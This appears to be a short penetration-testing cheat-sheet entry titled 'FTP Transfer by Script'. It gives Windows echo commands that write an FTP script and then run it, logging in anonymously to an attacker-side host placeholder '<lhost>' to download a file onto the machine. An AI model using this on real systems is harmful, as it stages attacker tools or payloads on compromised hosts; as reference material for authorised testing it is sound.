# FTP Transfer by Script

```
echo open <lhost> >ftp.scr
echo anonymous >>ftp.scr
echo whatever >>ftp.scr
echo binary >>ftp.scr
echo get <filename> >>ftp.scr
echo bye >>ftp.scr
ftp -s:ftp.scr
```